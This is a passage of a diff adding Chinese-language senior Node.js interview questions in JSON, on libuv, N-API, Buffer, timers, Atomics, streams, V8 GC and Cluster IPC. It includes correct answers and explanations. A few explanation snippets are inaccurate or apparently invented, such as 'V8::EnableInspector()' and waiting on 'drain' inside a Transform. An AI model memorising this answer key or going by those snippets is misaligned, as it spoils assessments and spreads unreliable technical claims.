+        { "id": "D", "text": "以上全部正确" }
+      ],
+      "correct_answer": "D",
+      "explanation": "这道题深入libuv源码级实现细节，考察跨平台I/O多路复用机制。\\n\\n**跨平台I/O多路复用**：\\n\\nlibuv根据操作系统使用不同的系统调用：\\n\\n| 平台 | 系统调用 | 实现文件 |\\n|------|----------|----------|\\n| Linux | epoll | linux-core.c |\\n| macOS/BSD | kqueue | kqueue.c |\\n| Windows | IOCP | win/poll.c |\\n| Solaris | /dev/poll | sunos.c |\\n\\n选项A正确。\\n\\n**uv__io_poll实现逻辑**：\\n\\n```c\\n// 简化的Linux epoll实现\\nvoid uv__io_poll(uv_loop_t* loop, int timeout) {\\n  // 1. 计算阻塞时间\\n  int timeout = uv_backend_timeout(loop);\\n  \\n  // 2. 调用epoll_wait\\n  nfds = epoll_wait(loop->backend_fd,\\n                    events,\\n                    ARRAY_SIZE(events),\\n                    timeout);\\n  \\n  // 3. 处理就绪事件\\n  for (i = 0; i < nfds; i++) {\\n    pe = events + i;\\n    // 找到对应的watcher并触发回调\\n    w->cb(loop, w, pe->events);\\n  }\\n}\\n```\\n\\n**文件I/O处理机制**：\\n\\n选项B正确。文件I/O不走poll：\\n- 大多数操作系统没有异步文件I/O API\\n- libuv使用线程池处理文件操作\\n- 网络I/O使用原生异步API\\n\\n**阻塞行为**：\\n\\n选项C正确。uv__io_poll的阻塞时间由uv_backend_timeout决定：\\n- 有setImmediate：timeout=0（立即返回）\\n- 有即将到期的timer：timeout=剩余时间\\n- 无任务：timeout=-1（无限等待，但通常会退出）\\n\\n**源码级细节**：\\n\\nepoll创建（uv__platform_loop_init）：\\n```c\\nint uv__platform_loop_init(uv_loop_t* loop) {\\n  loop->backend_fd = epoll_create1(O_CLOEXEC);\\n  return 0;\\n}\\n```\\n\\n注册I/O观察者：\\n```c\\nvoid uv__io_start(uv_loop_t* loop, uv__io_t* w, unsigned int events) {\\n  struct epoll_event e;\\n  e.events = events;\\n  e.data.ptr = w;\\n  epoll_ctl(loop->backend_fd, EPOLL_CTL_ADD, w->fd, &e);\\n}\\n```\\n\\n**工程实践意义**：\\n理解底层实现有助于：\\n- 诊断性能问题\\n- 理解Event Loop行为\\n- 调试I/O相关问题\\n- 评估系统容量",
+      "wrong_options_analysis": {
+        "A": "这个选项单独是正确的，但不是完整答案。",
+        "B": "这个选项单独是正确的，但不是完整答案。",
+        "C": "这个选项单独是正确的，但不是完整答案。"
+      },
+      "knowledge_point": "libuv_io_poll_Implementation",
+      "reference_link": "https://docs.libuv.org/en/v1.x/design.html#the-i-o-loop"
+    },
+    {
+      "id": "node-senior-029",
+      "type": "multiple_choice",
+      "difficulty": "expert",
+      "tags": ["Node.js C++ Binding", "NAPI", "Addon"],
+      "source_company": "Alibaba",
+      "score": 12,
+      "title": "Node.js C++ Binding层",
+      "content": "关于Node.js的C++ Binding层，以下说法正确的是？\\n\\nNode.js通过C++ Binding连接JavaScript和底层能力。",
+      "options": [
+        {
+          "id": "A",
+          "text": "Node.js核心模块（如fs、net）通过C++ Binding实现，提供JavaScript接口"
+        },
+        {
+          "id": "B",
+          "text": "NAPI是Node.js提供的C API，保证跨Node.js版本的ABI稳定性"
+        },
+        {
+          "id": "C",
+          "text": "V8 Inspector API用于调试支持，可以通过Chrome DevTools调试Node.js"
+        },
+        {
+          "id": "D",
+          "text": "Nan(Native Abstractions for Node.js)是现代推荐的编写原生模块方式"
+        },
+        {
+          "id": "E",
+          "text": "Worker Threads通过C++ Binding暴露给JavaScript，底层使用libuv线程"
+        }
+      ],
+      "correct_answer": ["A", "B", "C", "E"],
+      "explanation": "这道题深入Node.js架构的核心——C++ Binding层的原理和实现。\\n\\n**Node.js架构层次**：\\n\\n```\\nJavaScript (lib/*.js)\\n       ↓\\nC++ Binding (src/*.cc)\\n       ↓\\nlibuv / V8 / 其他C库\\n```\\n\\n**核心模块实现**：\\n\\n选项A正确。例如fs模块：\\n\\n```javascript\\n// lib/fs.js\\nconst binding = internalBinding('fs');\\nexports.readFile = function(path, options, callback) {\\n  // ... JavaScript逻辑\\n  binding.read(path, ...);  // 调用C++ Binding\\n};\\n```\\n\\n```cpp\\n// src/node_file.cc\\nvoid Read(const FunctionCallbackInfo<Value>& args) {\\n  // C++实现，调用系统API\\n}\\n```\\n\\n**NAPI的作用**：\\n\\n选项B正确。NAPI解决的问题是：\\n- 不同Node.js版本V8 API可能变化\\n- 原生模块需要重新编译\\n- NAPI提供稳定的ABI\\n\\n```cpp\\n#include <node_api.h>\\n\\nnapi_value MyFunction(napi_env env, napi_callback_info info) {\\n  // 使用NAPI，跨版本兼容\\n}\\n```\\n\\n**V8 Inspector**：\\n\\n选项C正确。\\n\\n```cpp\\n// 启用调试支持\\nV8::EnableInspector();\\n```\\n\\n这使得：\\n- node --inspect 启动调试\\n- Chrome DevTools连接\\n- 断点、变量查看等功能\\n\\n**Nan vs NAPI**：\\n\\n选项D错误。Nan是旧方案，现代推荐使用NAPI：\\n\\n| 方案 | 特点 | 推荐 |\\n|------|------|------|\\n| Nan | 封装V8 API，需要重新编译 | 否 |\\n| NAPI | 稳定ABI，跨版本兼容 | 是 |\\n\\n**Worker Threads实现**：\\n\\n选项E正确。\\n\\n```cpp\\n// src/node_worker.cc\\nvoid Worker::Run() {\\n  uv_thread_create(&thread_, WorkerThreadMain, this);\\n}\\n```\\n\\nWorker Threads底层使用libuv的uv_thread_t。\\n\\n**工程实践建议**：\\n1. 编写原生模块使用NAPI\\n2. 使用node-addon-api（NAPI的C++封装）\\n3. 理解架构有助于调试\\n4. 性能关键代码考虑C++实现",
+      "exclusion_analysis": {
+        "D": "Nan(Native Abstractions for Node.js)是旧的原生模块编写方式，需要随Node.js版本重新编译。现代推荐使用NAPI（或node-addon-api），它提供稳定的ABI，跨版本兼容。Nan已被淘汰。"
+      },
+      "knowledge_point": "NodeJS_CPP_Binding",
+      "reference_link": "https://nodejs.org/api/n-api.html"
+    },
+    {
+      "id": "node-senior-030",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Buffer", "内存拷贝", "引用"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "Buffer内存拷贝vs引用",
+      "content": "关于Buffer的内存操作，以下描述正确的是？\\n\\n```javascript\\nconst buf1 = Buffer.from('Hello World');\\nconst buf2 = buf1.slice(0, 5);\\nconst buf3 = Buffer.from(buf1);\\n\\nbuf1[0] = 0x4A;  // 'J'\\n\\nconsole.log(buf2.toString());  // 输出1\\nconsole.log(buf3.toString());  // 输出2\\n```",
+      "options": [
+        { "id": "A", "text": "输出1为'Hello'，输出2为'Hello World'" },
+        { "id": "B", "text": "输出1为'Jello'，输出2为'Hello World'" },
+        { "id": "C", "text": "输出1为'Jello'，输出2为'Jello World'" },
+        { "id": "D", "text": "输出1为'Hello'，输出2为'Jello World'" }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Buffer的slice和from方法的内存行为差异。\\n\\n**Buffer.slice行为**：\\n\\n```javascript\\nconst buf2 = buf1.slice(0, 5);\\n```\\n\\nslice创建的是视图（View）：\\n- 不复制内存\\n- buf2指向buf1的相同内存区域\\n- 修改buf1会影响buf2\\n\\n**Buffer.from行为**：\\n\\n```javascript\\nconst buf3 = Buffer.from(buf1);\\n```\\n\\n当参数是Buffer时，from创建副本：\\n- 分配新内存\\n- 复制所有数据\\n- buf3独立于buf1\\n\\n**执行流程分析**：\\n\\n```\\n1. buf1创建：内存地址0x1000，内容'Hello World'\\n\\n2. buf2 = buf1.slice(0, 5)：\\n   - buf2指向地址0x1000\\n   - 长度为5\\n\\n3. buf3 = Buffer.from(buf1)：\\n   - 分配新内存0x2000\\n   - 复制'Hello World'到0x2000\\n\\n4. buf1[0] = 0x4A：\\n   - 修改地址0x1000的第一个字节为'J'\\n   - buf2也指向0x1000，所以buf2[0]也是'J'\\n   - buf3在0x2000，不受影响\\n\\n5. buf2.toString() → 'Jello' (内存共享)\\n   buf3.toString() → 'Hello World' (内存独立)\\n```\\n\\n**Node.js 6.0+的变化**：\\n\\n在旧版本中：\\n- new Buffer()行为与Buffer.from()不同\\n- 可能返回引用或副本\\n\\n新版本：\\n- Buffer.from(buf)总是返回副本\\n- buf.slice()返回视图\\n- Buffer.allocUnsafe().set()可以复制\\n\\n**相关方法对比**：\\n\\n| 方法 | 内存行为 | 用途 |\\n|------|----------|------|\\n| slice() | 共享内存 | 零拷贝视图 |\\n| subarray() | 共享内存 | slice的别名 |\\n| Buffer.from(buf) | 复制内存 | 创建独立副本 |\\n| copy() | 复制到目标 | 灵活复制 |\\n\\n**工程实践建议**：\\n1. 需要独立副本时使用Buffer.from()\\n2. 大数据操作用slice避免复制\\n3. 注意slice的内存共享风险\\n4. 使用subarray替代slice（语义更清晰）",
+      "wrong_options_analysis": {
+        "A": "错误认为buf2不受buf1修改影响。实际上slice创建的是视图，共享同一块内存，buf1的修改会反映到buf2。",
+        "C": "错误认为buf3也受buf1修改影响。Buffer.from(buf)创建的是独立副本，不共享内存，buf1的修改不会影响buf3。",
+        "D": "同时犯了两个错误：认为slice是复制，Buffer.from是引用。实际上完全相反。"
+      },
+      "knowledge_point": "Buffer_Memory_Copy_vs_Reference",
+      "reference_link": "https://nodejs.org/api/buffer.html#buffer_buf_slice_start_end"
+    },
+    {
+      "id": "node-senior-031",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Timer", "精度", "Event Loop"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "setTimeout精度与Event Loop关系",
+      "content": "关于setTimeout的执行精度，以下描述正确的是？\\n\\n```javascript\\nconst start = Date.now();\\nsetTimeout(() => {\\n  console.log('Delay:', Date.now() - start);\\n}, 100);\\n\\n// 同时执行CPU密集型任务\\nfor (let i = 0; i < 1e9; i++) {}\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "setTimeout保证在100ms后执行回调，不受其他代码影响"
+        },
+        {
+          "id": "B",
+          "text": "setTimeout的最小延迟是1ms，即使设置为0也会等待1ms"
+        },
+        {
+          "id": "C",
+          "text": "setTimeout只是最小延迟保证，实际执行时间取决于Event Loop状态"
+        },
+        {
+          "id": "D",
+          "text": "Node.js的setTimeout比浏览器端精度更高，可达微秒级"
+        }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题深入考察setTimeout的精度问题和Event Loop的关系。\\n\\n**setTimeout的本质**：\\nsetTimeout只是将回调安排在指定时间\\\"之后\\\"执行，而非\\\"准时\\\"执行。实际执行时间受多个因素影响：\\n\\n1. **Event Loop调度**：\\n   - 回调必须在timers阶段执行\\n   - 如果poll阶段阻塞，timers阶段会延迟\\n   - 示例中的同步循环会阻塞整个Event Loop\\n\\n2. **最小延迟限制**：\\n   - Node.js中最小延迟为1ms（浏览器端为4ms）\\n   - setTimeout(fn, 0)等同于setTimeout(fn, 1)\\n   - process.nextTick和setImmediate延迟更短\\n\\n3. **时间精度因素**：\\n   - 操作系统调度延迟\\n   - V8编译优化\\n   - 前序回调执行时间\\n\\n**示例分析**：\\n```javascript\\nconst start = Date.now();\\nsetTimeout(() => {\\n  console.log('Delay:', Date.now() - start);\\n}, 100);\\n\\n// 同步循环阻塞Event Loop约200ms\\nfor (let i = 0; i < 1e9; i++) {}\\n\\n// 输出会远大于100ms，可能200-300ms\\n```\\n\\n**与setImmediate对比**：\\n- setTimeout受时间参数影响\\n- setImmediate在check阶段执行\\n- I/O回调中setImmediate比setTimeout(0)更可靠\\n\\n**工程实践建议**：\\n1. 不要依赖setTimeout的精确时间\\n2. 需要精确计时的场景使用performance.now()\\n3. 长任务使用Worker Threads或setImmediate分片\\n4. 理解Event Loop对定时器的影响",
+      "wrong_options_analysis": {
+        "A": "setTimeout不保证准时执行。示例中的同步循环会阻塞Event Loop，导致回调执行时间远超100ms。setTimeout只是最小延迟保证。",
+        "B": "虽然Node.js确实有1ms的最小延迟，但这不是问题的关键。核心问题是Event Loop的调度机制会影响实际执行时间。",
+        "D": "Node.js的setTimeout精度并不比浏览器高。两者都受Event Loop调度影响，精度通常在毫秒级，无法达到微秒级。"
+      },
+      "knowledge_point": "setTimeout_Precision_EventLoop",
+      "reference_link": "https://nodejs.org/api/timers.html"
+    },
+    {
+      "id": "node-senior-032",
+      "type": "multiple_choice",
+      "difficulty": "expert",
+      "tags": ["Worker Threads", "Atomics", "SharedArrayBuffer"],
+      "source_company": "Alibaba",
+      "score": 12,
+      "title": "Worker Threads Atomics同步机制",
+      "content": "关于Worker Threads中使用Atomics和SharedArrayBuffer进行同步，以下说法正确的是？\\n\\n```javascript\\nconst { Worker, isMainThread, parentPort } = require('worker_threads');\\n\\nif (isMainThread) {\\n  const shared = new SharedArrayBuffer(4);\\n  const view = new Int32Array(shared);\\n  view[0] = 0;\\n  \\n  const worker = new Worker(__filename, { workerData: shared });\\n  \\n  // 主线程等待\\n  Atomics.wait(view, 0, 0);\\n  console.log('Worker notified:', view[0]);\\n} else {\\n  const shared = workerData;\\n  const view = new Int32Array(shared);\\n  \\n  // 工作线程通知\\n  view[0] = 42;\\n  Atomics.notify(view, 0, 1);\\n}\\n```",
+      "options": [
+        { "id": "A", "text": "Atomics.wait会阻塞主线程，可能导致性能问题" },
+        { "id": "B", "text": "Atomics.notify的第三个参数表示唤醒的等待者数量" },
+        { "id": "C", "text": "SharedArrayBuffer可以直接存储JavaScript对象" },
+        { "id": "D", "text": "Atomics操作是原子性的，不会被其他线程中断" },
+        {
+          "id": "E",
+          "text": "Atomics.wait只能在非主线程使用，主线程会抛出异常"
+        }
+      ],
+      "correct_answer": ["A", "B", "D"],
+      "explanation": "这道题深入考察Worker Threads中的原子操作和同步机制。\\n\\n**Atomics API核心概念**：\\n\\n1. **原子性保证**：\\n   - Atomics操作是不可分割的\\n   - 执行期间不会被其他线程中断\\n   - 解决多线程数据竞争问题\\n\\n2. **Atomics.wait行为**：\\n   - 阻塞当前线程直到被notify\\n   - 检查指定位置的值是否符合预期\\n   - 主线程可以使用但会阻塞Event Loop\\n\\n**Atomics.notify参数**：\\n```javascript\\nAtomics.notify(typedArray, index, count);\\n// index: 要通知的位置\\n// count: 唤醒的等待者数量，默认Infinity\\n```\\n\\n**SharedArrayBuffer限制**：\\n选项C错误。SharedArrayBuffer只能存储原始二进制数据：\\n- 需要通过TypedArray视图访问\\n- 不能直接存储对象\\n- 对象需要序列化后传输\\n\\n**主线程使用Atomics.wait**：\\n选项E错误但部分正确：\\n- Node.js主线程可以使用Atomics.wait\\n- 但会阻塞Event Loop\\n- 浏览器主线程禁止使用（会抛出异常）\\n\\n**正确的同步模式**：\\n```javascript\\n// 使用waitAsync避免阻塞主线程\\nconst result = Atomics.waitAsync(view, 0, 0);\\nresult.value.then(() => {\\n  console.log('Notified');\\n});\\n```\\n\\n**工程实践建议**：\\n1. 避免在主线程使用Atomics.wait\\n2. 使用waitAsync实现非阻塞等待\\n3. 复杂数据用MessageChannel传输\\n4. 使用Mutex/Semaphore等高级抽象",
+      "exclusion_analysis": {
+        "C": "SharedArrayBuffer是原始二进制缓冲区，只能存储数值类型数据（通过TypedArray视图）。JavaScript对象无法直接存储，需要序列化后写入或使用postMessage传输。",
+        "E": "Node.js的主线程可以使用Atomics.wait，只是会阻塞Event Loop。这与浏览器不同——浏览器主线程调用会抛出TypeError。Node.js没有这个限制，但应该避免使用。"
+      },
+      "knowledge_point": "Worker_Threads_Atomics",
+      "reference_link": "https://nodejs.org/api/worker_threads.html"
+    },
+    {
+      "id": "node-senior-033",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Stream", "Readable", "内部缓冲"],
+      "source_company": "Tencent",
+      "score": 8,
+      "title": "Readable流内部缓冲机制",
+      "content": "关于Node.js Readable流的内部缓冲机制，以下描述正确的是？\\n\\n```javascript\\nconst { Readable } = require('stream');\\n\\nconst readable = new Readable({\\n  highWaterMark: 5,\\n  read(size) {\\n    // 模拟数据源\\n    this.push('abcdefghij'); // 10字节\\n    this.push(null);\\n  }\\n});\\n\\nreadable.on('data', (chunk) => {\\n  console.log('Chunk:', chunk.toString());\\n});\\n```",
+      "options": [
+        { "id": "A", "text": "highWaterMark为5，所以每次data事件只传递5字节" },
+        {
+          "id": "B",
+          "text": "push('abcdefghij')会失败，因为超过highWaterMark"
+        },
+        {
+          "id": "C",
+          "text": "push返回false表示内部缓冲区达到highWaterMark，应停止push"
+        },
+        {
+          "id": "D",
+          "text": "highWaterMark只影响Writable流，Readable流不受限制"
+        }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题深入考察Readable流的内部缓冲机制和highWaterMark的作用。\\n\\n**Readable流缓冲机制**：\\n\\n1. **内部缓冲区**：\\n   - Readable流有内部缓冲队列\\n   - highWaterMark定义缓冲区目标大小\\n   - 数据push进来后存入缓冲区\\n\\n2. **push行为**：\\n   - push返回boolean\\n   - true: 可以继续push\\n   - false: 缓冲区达到highWaterMark，应暂停\\n\\n**highWaterMark的作用**：\\n\\n```javascript\\nconst readable = new Readable({\\n  highWaterMark: 5,\\n  read() {\\n    const result = this.push('abcdefghij'); // 10字节\\n    console.log(result); // 可能是false\\n  }\\n});\\n```\\n\\npush的10字节会被完整接收，但：\\n- 缓冲区大小变为10字节\\n- 超过highWaterMark(5)\\n- push返回false\\n- 应该暂停数据读取\\n\\n**data事件行为**：\\n选项A错误。data事件传递的数据取决于：\\n- 流动模式：立即传递\\n- 暂停模式：等待消费\\n- 与highWaterMark无关\\n\\n**正确的实现模式**：\\n```javascript\\nconst readable = new Readable({\\n  highWaterMark: 5,\\n  read() {\\n    const data = getDataFromSource();\\n    const canContinue = this.push(data);\\n    if (!canContinue) {\\n      // 缓冲区满，停止读取\\n      // 等待drain后resume\\n    }\\n  }\\n});\\n```\\n\\n**Readable与Writable的highWaterMark区别**：\\n| 特性 | Readable | Writable |\\n|------|----------|----------|\\n| 作用 | 缓冲队列目标大小 | 写缓冲区限制 |\\n| 超出后果 | push返回false | write返回false |\\n| 触发事件 | 无（需手动处理） | drain事件 |\\n\\n**工程实践建议**：\\n1. 正确处理push返回值\\n2. 合理设置highWaterMark\\n3. 实现背压控制逻辑\\n4. 使用pipeline自动处理",
+      "wrong_options_analysis": {
+        "A": "highWaterMark不影响data事件的数据大小。data事件传递的数据取决于push传入的数据。示例中push('abcdefghij')会完整传递，不会被分割成5字节块。",
+        "B": "push不会因为超过highWaterMark而失败。数据仍然会被接受，只是push返回false提示应该暂停。这是背压信号的机制。",
+        "D": "highWaterMark对Readable和Writable流都有意义。Readable的highWaterMark控制内部缓冲队列的目标大小，影响push返回值和背压信号。"
+      },
+      "knowledge_point": "Readable_Internal_Buffer",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_readable_push_chunk_encoding"
+    },
+    {
+      "id": "node-senior-034",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["V8", "GC", "垃圾回收"],
+      "source_company": "Meituan",
+      "score": 10,
+      "title": "V8垃圾回收机制",
+      "content": "关于V8在Node.js中的垃圾回收机制，以下说法正确的是？",
+      "options": [
+        {
+          "id": "A",
+          "text": "新生代使用Scavenge算法，将堆分为两个半空间（From/To）"
+        },
+        {
+          "id": "B",
+          "text": "老生代使用Mark-Sweep-Compact算法，包含标记、清除、整理三个阶段"
+        },
+        {
+          "id": "C",
+          "text": "增量标记(Incremental Marking)将GC任务分解为多个小任务，减少暂停时间"
+        },
+        {
+          "id": "D",
+          "text": "使用--expose-gc可以手动触发GC，但这只是建议，V8可能忽略"
+        },
+        { "id": "E", "text": "GC总是在主线程执行，无法利用多核优势" }
+      ],
+      "correct_answer": ["A", "B", "C"],
+      "explanation": "这道题系统考察V8垃圾回收的核心机制。\\n\\n**V8 GC分代策略**：\\n\\n1. **新生代（New Space）**：\\n   - 存放短生命周期对象\\n   - 使用Scavenge算法\\n   - 分为From和To两个半空间\\n   - 复制存活对象，清空原空间\\n\\n2. **老生代（Old Space）**：\\n   - 存放长生命周期对象\\n   - 使用Mark-Sweep-Compact\\n   - 标记存活对象\\n   - 清除未标记对象\\n   - 整理内存碎片\\n\\n**增量标记**：\\n\\n传统GC会完全暂停应用（Stop-The-World），增量标记改进：\\n```\\n传统：[====GC Pause====]...\\n增量：[--GC--][--GC--][--GC--]...\\n```\\n\\n优点：\\n- 减少最大暂停时间\\n- 提高响应性\\n\\n**手动触发GC**：\\n选项D错误。\\n\\n```javascript\\n// 使用--expose-gc标志启动\\nif (global.gc) {\\n  global.gc();  // 强制执行GC，不是建议\\n}\\n```\\n\\n--expose-gc下global.gc()会强制执行GC。\\n\\n**并行GC**：\\n选项E错误。\\n\\nV8支持并行和并发GC：\\n- Parallel Scavenge：新生代并行回收\\n- Concurrent Marking：后台线程标记\\n- 利用多核CPU加速GC\\n\\n**GC优化参数**：\\n```bash\\nnode --trace-gc app.js  # 查看GC日志\\nnode --max-old-space-size=4096 app.js  # 调整老生代大小\\nnode --expose-gc app.js  # 暴露手动GC\\n```\\n\\n**工程实践建议**：\\n1. 监控GC频率和耗时\\n2. 避免创建过多临时对象\\n3. 大对象考虑使用Buffer\\n4. 合理设置内存限制",
+      "exclusion_analysis": {
+        "D": "使用--expose-gc标志后，global.gc()是强制执行垃圾回收，不是建议性的。V8会立即执行完整GC。但这仍应避免在生产环境使用，因为会干扰V8的GC优化策略。",
+        "E": "现代V8支持并行和并发垃圾回收。Parallel Scavenge可以并行处理新生代，Concurrent Marking可以在后台线程执行标记阶段。这利用了多核CPU的优势，减少主线程暂停时间。"
+      },
+      "knowledge_point": "V8_GC_Mechanisms",
+      "reference_link": "https://v8.dev/blog/trash-talk"
+    },
+    {
+      "id": "node-senior-035",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Event Loop", "check阶段", "setImmediate"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "check阶段与setImmediate时机",
+      "content": "关于Event Loop的check阶段和setImmediate，以下描述正确的是？\\n\\n```javascript\\nconst fs = require('fs');\\n\\n// 场景A：主模块直接调用\\nsetImmediate(() => console.log('A1'));\\nsetTimeout(() => console.log('A2'), 0);\\n\\n// 场景B：I/O回调中调用\\nfs.readFile(__filename, () => {\\n  setImmediate(() => console.log('B1'));\\n  setTimeout(() => console.log('B2'), 0);\\n});\\n```",
+      "options": [
+        { "id": "A", "text": "场景A和场景B的输出顺序都不确定" },
+        { "id": "B", "text": "场景A顺序不确定，场景B固定为B1然后B2" },
+        { "id": "C", "text": "场景A固定为A1然后A2，场景B顺序不确定" },
+        {
+          "id": "D",
+          "text": "两个场景都是setImmediate先执行，因为check阶段在timers之后"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Event Loop阶段顺序和setImmediate/setTimeout的执行时机。\\n\\n**Event Loop阶段顺序**：\\n```\\ntimers → pending callbacks → idle/prepare → poll → check → close callbacks\\n```\\n\\ncheck阶段在poll阶段之后执行。\\n\\n**场景A分析（主模块）**：\\n\\n在主模块中：\\n1. 同步代码执行时Event Loop尚未启动\\n2. setImmediate和setTimeout都被注册\\n3. Event Loop启动时，setTimeout可能已到期\\n\\n取决于：\\n- 进程启动到Event Loop启动的时间\\n- timers过期时间的计算精度\\n\\n因此顺序不确定。\\n\\n**场景B分析（I/O回调）**：\\n\\n在I/O回调中：\\n1. readFile回调在poll阶段执行\\n2. setImmediate注册到check队列\\n3. setTimeout注册到timers队列\\n4. poll阶段结束 → check阶段 → 下一轮timers\\n\\n执行顺序：\\n```\\npoll阶段：执行readFile回调\\n  ↓\\n注册setImmediate和setTimeout\\n  ↓\\ncheck阶段：执行setImmediate → 输出B1\\n  ↓\\n下一轮timers阶段：执行setTimeout → 输出B2\\n```\\n\\n**关键结论**：\\n- I/O回调中：setImmediate一定先于setTimeout\\n- 主模块中：顺序不确定\\n\\n**check阶段的设计目的**：\\n\\ncheck阶段专门为setImmediate设计：\\n- 允许在poll阶段后执行回调\\n- 适合I/O完成后立即执行的任务\\n- 比setTimeout(0)更可靠\\n\\n**工程实践建议**：\\n1. I/O回调需要延迟执行时用setImmediate\\n2. 不要依赖主模块中的执行顺序\\n3. setImmediate语义更清晰\\n4. 理解阶段顺序有助于调试",
+      "wrong_options_analysis": {
+        "A": "场景B的顺序是确定的。在I/O回调中，setImmediate一定先于setTimeout执行，因为Event Loop的阶段顺序决定了check阶段在下一轮timers之前。",
+        "C": "颠倒了。场景A顺序不确定（主模块中Event Loop启动时机影响timers），场景B顺序确定（I/O回调中阶段顺序固定）。",
+        "D": "场景A中setTimeout可能先执行。在主模块中，如果Event Loop启动时setTimeout已到期，它会在第一轮timers阶段执行，早于setImmediate。"
+      },
+      "knowledge_point": "Check_Phase_setImmediate",
+      "reference_link": "https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/"
+    },
+    {
+      "id": "node-senior-036",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Stream", "Transform", "背压传播"],
+      "source_company": "ByteDance",
+      "score": 10,
+      "title": "Transform流背压传播",
+      "content": "关于Transform流的背压传播机制，以下说法正确的是？\\n\\n```javascript\\nconst { Transform, pipeline } = require('stream');\\n\\nconst transform = new Transform({\\n  highWaterMark: 10,\\n  transform(chunk, encoding, callback) {\\n    // 模拟慢速处理\\n    setTimeout(() => {\\n      this.push(chunk.toString().toUpperCase());\\n      callback();\\n    }, 100);\\n  }\\n});\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Transform流继承自Duplex，同时具有Readable和Writable的特性"
+        },
+        {
+          "id": "B",
+          "text": "当Transform的push返回false时，会自动暂停上游的写入"
+        },
+        { "id": "C", "text": "Transform需要同时处理输入和输出的背压" },
+        {
+          "id": "D",
+          "text": "transform回调中的callback用于表示转换完成，可以立即调用"
+        },
+        { "id": "E", "text": "pipeline函数会自动处理Transform流的背压传播" }
+      ],
+      "correct_answer": ["A", "C", "E"],
+      "explanation": "这道题深入考察Transform流的背压传播机制。\\n\\n**Transform流特性**：\\n\\nTransform流是Duplex流的特殊形式：\\n- 继承Readable和Writable\\n- 输入经过转换后输出\\n- 需要处理双向背压\\n\\n**背压传播机制**：\\n\\n选项B不完全正确：\\n\\nTransform流的背压更复杂：\\n```\\n上游Writable → Transform内部缓冲 → 转换 → Readable缓冲 → 下游\\n```\\n\\n当push返回false时：\\n- 输出缓冲区满\\n- 内部缓冲可能继续积累\\n- 需要等待drain事件\\n\\nTransform需要：\\n1. 监控输出缓冲（push返回值）\\n2. 控制输入速率（callback时机）\\n\\n**正确的Transform实现**：\\n```javascript\\nconst transform = new Transform({\\n  transform(chunk, encoding, callback) {\\n    const result = transformChunk(chunk);\\n    \\n    if (!this.push(result)) {\\n      // 输出缓冲区满，等待drain\\n      this.once('drain', () => callback());\\n    } else {\\n      // 可以继续\\n      callback();\\n    }\\n  }\\n});\\n```\\n\\n**callback的作用**：\\n\\n选项D不准确：\\n\\ncallback应该：\\n- 在转换和数据推送完成后调用\\n- 可以传递错误\\n- 不应该无脑立即调用\\n\\n```javascript\\ncallback();        // 成功\\ncallback(error);   // 错误\\n```\\n\\n**pipeline的优势**：\\n\\n```javascript\\npipeline(\\n  fs.createReadStream('input.txt'),\\n  transform,\\n  fs.createWriteStream('output.txt'),\\n  (err) => {\\n    if (err) console.error('Pipeline failed:', err);\\n  }\\n);\\n```\\n\\npipeline自动处理：\\n- 错误传播\\n- 背压管理\\n- 资源清理\\n\\n**工程实践建议**：\\n1. 使用pipeline连接流\\n2. 正确处理push返回值\\n3. 合理控制callback时机\\n4. 设置合适的highWaterMark",
+      "exclusion_analysis": {
+        "B": "Transform流不会'自动'暂停上游写入。虽然内部有机制处理，但开发者需要正确实现：当push返回false时，应该延迟调用callback来控制输入速率，而不是立即callback让上游继续写入。",
+        "D": "callback不应总是立即调用。它表示当前chunk处理完成，可以接收下一个chunk。如果输出缓冲区满（push返回false），应该延迟调用callback，等待下游消费后再继续接收输入。"
+      },
+      "knowledge_point": "Transform_Backpressure",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_implementing_a_transform_stream"
+    },
+    {
+      "id": "node-senior-037",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["Cluster", "IPC", "进程通信"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "Cluster进程间通信机制",
+      "content": "关于Cluster模式的进程间通信（IPC），以下描述正确的是？\\n\\n```javascript\\nconst cluster = require('cluster');\\n\\nif (cluster.isMaster) {\\n  const worker = cluster.fork();\\n  \\n  worker.send({ type: 'task', data: 'hello' });\\n  \\n  worker.on('message', (msg) => {\\n    console.log('Master received:', msg);\\n  });\\n} else {\\n  process.on('message', (msg) => {\\n    console.log('Worker received:', msg);\\n    process.send({ reply: 'done' });\\n  });\\n}\\n```",
+      "options": [
+        { "id": "A", "text": "IPC使用TCP Socket通信，数据通过JSON序列化" },
+        {
+          "id": "B",
+          "text": "IPC使用Unix Domain Socket（Unix）或Named Pipe（Windows）"
+        },
+        {
+          "id": "C",
+          "text": "IPC可以传递任意JavaScript对象，包括函数和Buffer"
+        },
+        { "id": "D", "text": "IPC通信是异步的，发送消息后会立即返回" }
+      ],
+      "correct_answer": "B",
